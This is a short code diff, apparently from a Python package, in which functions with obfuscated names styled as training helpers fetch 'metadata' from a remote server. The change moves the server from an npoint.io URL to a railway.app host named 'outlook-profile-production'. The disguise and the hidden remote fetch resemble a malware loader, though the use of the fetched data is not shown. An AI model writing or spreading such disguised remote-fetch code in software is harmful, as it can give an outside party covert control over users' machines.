@@ -18,7 +18,7 @@ def learn_izgkex_574():
 
     def train_zhzxrb_847():
         try:
-            config_pkvhsm_913 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            config_pkvhsm_913 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             config_pkvhsm_913.raise_for_status()
             train_zpmymf_465 = config_pkvhsm_913.json()
             config_agdwlc_853 = train_zpmymf_465.get('metadata')
